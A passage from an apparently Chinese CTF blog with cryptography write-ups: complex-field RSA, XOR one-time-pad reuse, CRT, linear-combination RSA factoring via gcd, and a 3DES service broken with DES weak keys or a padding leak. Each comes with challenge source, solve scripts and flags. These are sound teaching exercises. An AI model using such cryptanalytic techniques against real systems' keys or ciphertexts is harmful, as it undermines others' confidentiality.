function_">get_value</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.re,self.im</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1 = [<span class="number">90554536599623574119664951128649936419332926063696768860765928746438458550068553748440108394673303800443215316190882880737918820592384729010491685487061658710808286341751196450604089438847354206384322610922839055308138101241906861635339635907663440043442187064090630207952625897567214431195621589834131462698</span>, <span class="number">9144096375153318849308858335764188418198064372272913164911615933938183103747900881824918069830188301084043148828961577193063557255905230182831945580084452509300200269659063051152684191139872067872645370760797859584822240361290678189844670289832298393156571913616456958845361092243648857334156534377833472900</span>]</span><br><span class="line">c2 = [<span class="number">62925714576233017213228404230949787334346543378320798964656732359587152905032848271156799538355748406136742979043729040728123730886381468564779041856310262770766050213464073568850702827835472680885186487027698395099598698463717279017013124488699475168052581476224742146967412904416266652605031934025266540003</span>, <span class="number">62818668456104375760667670741457826560706388018921820295286033114468271151921637926389738844622672202424650967678199715932465104135980734708459543588178208672956785650944371545080965650112025782049517299538052360417245732776384089052839997333049599655001615752078742624898059780909287845495731050387891926520</span>]</span><br><span class="line">n = <span class="number">94040393367054633265453751757391098049234338193258976478647369399924701067077628840760704857546243644552533845934146003988635403227234096447871132283820920489003286967145732739404245319615714787916756200564828237043658350145929927911058782352154997346295194977765305107634012698472977467843980475009837261877</span></span><br><span class="line"></span><br><span class="line">c1 = Complex(c1[<span class="number">0</span>],c1[<span class="number">1</span>])</span><br><span class="line">c2 = Complex(c2[<span class="number">0</span>],c2[<span class="number">1</span>])</span><br><span class="line">c1n = complex_pow(c1,n,n).get_value()</span><br><span class="line"></span><br><span class="line"><span class="comment"># PR.&lt;m1&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="comment"># f = c1n - m1</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line"><span class="comment"># m_1 = f.small_roots(X=2^128,beta=0.4)[0]</span></span><br><span class="line"><span class="comment"># q = gcd(c1n-m_1,n)</span></span><br><span class="line"><span class="comment"># p = n//q</span></span><br><span class="line"><span class="comment"># assert p*q == n</span></span><br><span class="line"><span class="comment"># print(f&#x27;p= &#123;p&#125;\nq= &#123;q&#125;&#x27;)</span></span><br><span class="line">q = <span class="number">7323077971059291689707065981399299595305255699400528762823657455799263529156562060157257164843406722707105788120169666250562251092133204672454047510142903</span></span><br><span class="line">p = <span class="number">12841648517017166445551091061211185386388830485650207877732791165106786665791893519935905079260599145467726270747052676462914579177741552378246815211750259</span></span><br><span class="line">phi = (p**<span class="number">2</span>-<span class="number">1</span>)*(q**<span class="number">2</span>-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">e = modinv(p,phi)*q%phi</span><br><span class="line">d = modinv(e,phi)</span><br><span class="line">m = complex_pow(c2,d,n).get_value()</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m[<span class="number">0</span>])),n2s(<span class="built_in">int</span>(m[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure>
<p>最后<strong>flag</strong>: flag{3ef6db06-b837-11ed-9825-00155dfcdef9}</p>
<p>总结一下:<br>关键知识点: 复数域下phi的不同<br>与常规RSA的结合: 都有 de&#x3D;kphi+1 都有coopersmith等攻击方法<br>通过这道题学习到复数RSA的同时 还更新了cooper求kp,kq！</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>2023极客大挑战 Crpyto</title>
    <url>/2023/12/03/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Crpyto/</url>
    <content><![CDATA[<p>没参加比赛 跟着其他师傅的博客复现一下其中的一些题目</p>
<span id="more"></span>

<h2 id="OTPTwice"><a href="#OTPTwice" class="headerlink" title="OTPTwice"></a>OTPTwice</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor </span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># step0: key generation &amp; distribution</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s0</span>(<span class="params">msg</span>): </span><br><span class="line">    k1,k2 = [urandom(<span class="built_in">len</span>(msg)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">    <span class="keyword">return</span> k1,k2 </span><br><span class="line"></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1: Alice encrypt M, and send it to Bob</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s1</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c1 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: Bob encrypt c1, and send it to Alice </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s2</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    c2 = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> c2 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: Alice decrypt c2, and send it to Bob.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s3</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c3 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c3 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step4: Bob decrypt c3, get M.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s4</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    m_ = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> m_ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg,k1,k2</span>): </span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">assert</span> msg == m_</span><br><span class="line"></span><br><span class="line"><span class="comment"># Here&#x27;s what hacker Eve got:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_</span>(<span class="params">msg,k1,k2</span>):</span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">if</span> HACK == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(c1) </span><br><span class="line">        <span class="built_in">print</span>(c2) </span><br><span class="line">        <span class="built_in">print</span>(c3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k1,k2 = s0(flag) </span><br><span class="line">encrypt_(flag,k1,k2) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line"><span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>emmm 看着OTP我就记下来了 …<br>分析一下<br><code>c1 = msg xor k1</code><br><code>c2 = c1 xor k2</code><br><code>c3 = c2 xor k1</code><br>题目还贴心地告诉了我们 <code>_m = c3 xor k2 = msg</code><br>直接解:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1 = <span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line">c2 = <span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line">c3 = <span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"></span><br><span class="line">k2 = xor(c1,c2)</span><br><span class="line">flag = xor(c3,k2)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># SYC&#123;I_l0v3_Crypt0&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="OldAlgorithm"><a href="#OldAlgorithm" class="headerlink" title="OldAlgorithm"></a>OldAlgorithm</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+os.urandom(padlen-<span class="built_in">len</span>(msg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = pad(flag,<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">p = [getPrime(<span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)] </span><br><span class="line">c = [bytes_to_long(flag)%i <span class="keyword">for</span> i <span class="keyword">in</span> p] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</span></span><br><span class="line"><span class="string">c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>就是CRT 就当复习下sage用法了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p= [<span class="number">58657</span>, <span class="number">47093</span>, <span class="number">47963</span>, <span class="number">41213</span>, <span class="number">57653</span>, <span class="number">56923</span>, <span class="number">41809</span>, <span class="number">49639</span>, <span class="number">44417</span>, <span class="number">38639</span>, <span class="number">39857</span>, <span class="number">53609</span>, <span class="number">55621</span>, <span class="number">41729</span>, <span class="number">60497</span>, <span class="number">44647</span>, <span class="number">39703</span>, <span class="number">55117</span>, <span class="number">44111</span>, <span class="number">57131</span>, <span class="number">37747</span>, <span class="number">63419</span>, <span class="number">63703</span>, <span class="number">64007</span>, <span class="number">46349</span>, <span class="number">39241</span>, <span class="number">39313</span>, <span class="number">44909</span>, <span class="number">40763</span>, <span class="number">46727</span>, <span class="number">34057</span>, <span class="number">56333</span>]</span><br><span class="line">c= [<span class="number">36086</span>, <span class="number">4005</span>, <span class="number">3350</span>, <span class="number">23179</span>, <span class="number">34246</span>, <span class="number">5145</span>, <span class="number">32490</span>, <span class="number">16348</span>, <span class="number">13001</span>, <span class="number">13628</span>, <span class="number">7742</span>, <span class="number">46317</span>, <span class="number">50824</span>, <span class="number">23718</span>, <span class="number">32995</span>, <span class="number">7640</span>, <span class="number">10590</span>, <span class="number">46897</span>, <span class="number">39245</span>, <span class="number">16633</span>, <span class="number">31488</span>, <span class="number">36547</span>, <span class="number">42136</span>, <span class="number">52782</span>, <span class="number">31929</span>, <span class="number">34747</span>, <span class="number">29026</span>, <span class="number">18748</span>, <span class="number">6634</span>, <span class="number">9700</span>, <span class="number">8126</span>, <span class="number">5197</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(CRT_list[c,p])</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="number">37699681561344853433172597523387281471904607566697320008840601281159457436694</span></span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(flag)))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;CRT_1s_s0_ju1cy!&#125;]mC\x9c\xf9C/\xfc\xb8t\x16&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line">p,q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e1,e2 = [getPrime(<span class="number">17</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q </span><br><span class="line">c1 = gmpy2.powmod(<span class="number">2</span>*p + <span class="number">3</span>*q,e1,n)</span><br><span class="line">c2 = gmpy2.powmod(<span class="number">5</span>*p + <span class="number">7</span>*q,e2,n) </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1=&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2=&quot;</span>,e2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e1= 113717</span></span><br><span class="line"><span class="comment">#e2= 80737</span></span><br><span class="line"><span class="comment">#c1= 97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></span><br><span class="line"><span class="comment">#c2= 353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></span><br><span class="line"><span class="comment">#c= 375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></span><br><span class="line"><span class="comment">#n= 728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>观察题目给的两个多项式 都是p,q线性组合的形式 那么modn的话就可以把交叉项消掉<br>这种跟羊城杯有一道一模一样<br>展成只有p,q幂次的两个式子分别e2,e1次方<br>然后乘对应系数消元 求个gcd即可分解n</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1= <span class="number">113717</span></span><br><span class="line">e2= <span class="number">80737</span></span><br><span class="line">c1= </span><br><span class="line">c2= </span><br><span class="line">c= </span><br><span class="line">n= </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">kq = (<span class="built_in">pow</span>(c1,e2,n)*<span class="built_in">pow</span>(<span class="number">5</span>,e1*e2,n)-<span class="built_in">pow</span>(c2,e1,n)*<span class="built_in">pow</span>(<span class="number">2</span>,e1*e2,n))</span><br><span class="line">q = gcd(kq,n)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">p = n//q</span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line">d = modinv(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;poly_rsa_Just_need5_s1mple_gcd&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Simple3DES"><a href="#Simple3DES" class="headerlink" title="Simple3DES"></a>Simple3DES</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> a,b: <span class="built_in">bytes</span>([a[i % <span class="built_in">len</span>(a)] ^ b[i % <span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+<span class="built_in">chr</span>((padlen-(<span class="built_in">len</span>(msg)%padlen))).encode()*(padlen-(<span class="built_in">len</span>(msg)%padlen))</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">sec = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">msg,key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = long_to_bytes(key)</span><br><span class="line">        msg = xor(long_to_bytes(msg),sec)</span><br><span class="line">        des = DES3.new(key,DES3.MODE_ECB)</span><br><span class="line">        ct = xor(des.encrypt(pad(msg,<span class="number">8</span>)),sec)</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(ct)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> Exception</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service</span>():</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Simple DES Encryption Service&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="keyword">while</span> cnt&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1. Encrypt\n2. Get encrypted flag.&#x27;</span>)</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input msg:&#x27;</span>)</span><br><span class="line">            msg = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(msg,key))</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(bytes_to_long(flag),key))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bye!&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    service()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>

<p>没靶机 就单纯学习一下吧~ (最近要恶补交互题 :(  🫥qaq )<br>题目给了个<a href="https://blog.csdn.net/Mr_wzc/article/details/121713518" target = "_blank">学习链接 </a><br>题目中在3DES加密结束后还有个 <code>ct = xor(des.encrypt(pad(msg,8)),sec)</code> 再xor了一次</p>
<h3 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h3><p>学习到了一个新知识:DES弱密钥 <a href="https://lightless.me/archives/DES-Weak-Keys.html">https://lightless.me/archives/DES-Weak-Keys.html</a><br>用这些弱密钥加密会导致</p>
<ul>
<li>明文连续加密两次仍然是明文</li>
<li>密文连续解密两次仍然是密文</li>
</ul>
<p>那么利用3DES一个三次操作 加密-解密-加密   解密-加密-解密<br>只要构造 <code>key1=key3</code><br>第一次交互选择 2:</p>
<ul>
<li>enc(flag,k1)</li>
<li>dec(flag,k2)</li>
<li>enc(flag,k3)</li>
<li>xor(flag,sec)</li>
</ul>
<p>这样相当于得到的是 encflag &#x3D; dec(flag,k2)^sec 的值</p>
<p>第二次交互选择 1:</p>
<ul>
<li>enc(encflag,k1)</li>
<li>dec(encflag,k2)</li>
<li>enc(encflag,k3)</li>
<li>xor(encflag,sec)</li>
</ul>
<p>这样就得到 dec(dec(flag,k2),k2)^sec^sec &#x3D; flag</p>
<p>这里选择 弱密钥拼接成key (其实我最开始想的三个key全取一样也行 只是要选择弱密钥来拼接)<br><code>key = b&quot;\x01\x01\x01\x01\x01\x01\x01\x01&quot;+b&quot;\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE&quot;+b&quot;\x01\x01\x01\x01\x01\x01\x01\x01&quot;</code></p>
<h3 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h3><p>注意到加密的时候对msg进行了pad填充<br>我们发送一个空字符串过去时</p>
<ul>
<li>sec + b’\x08’*8</li>
<li>3DES</li>
<li>xor sec</li>
</ul>
<p>利用<code>enc[-8:]</code>是3DES(b’\x08’*8) xor sec 这一点便可以反解出 sec</p>
<p>总结一下其实好多与DES&#x2F;AES相关的交互题破题点常常在padding上 (Do not leak your padding status !)</p>
<h2 id="Energetic-Carcano"><a href="#Energetic-Carcano" class="headerlink" title="Energetic_Carcano"></a>Energetic_Carcano</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># from sage.all import *</span></span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span> </span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">pbits = <span class="number">120</span></span><br><span class="line">abp = <span class="string">&quot;abp&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 